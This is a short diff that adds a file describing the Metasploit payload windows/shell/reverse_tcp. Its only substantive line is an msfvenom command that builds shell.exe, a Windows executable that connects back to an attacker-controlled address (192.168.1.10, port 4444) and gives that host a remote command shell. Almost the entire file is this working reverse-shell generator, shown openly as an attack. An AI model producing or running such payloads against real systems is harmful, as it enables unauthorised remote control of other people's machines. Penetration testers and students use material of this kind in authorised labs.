@@ -1,0 +1,4 @@
+# windows/shell/reverse_tcp
+# This payload connects back to the attacker and spawns a Windows command shell.
+
+msfvenom -p windows/shell/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe > shell.exe
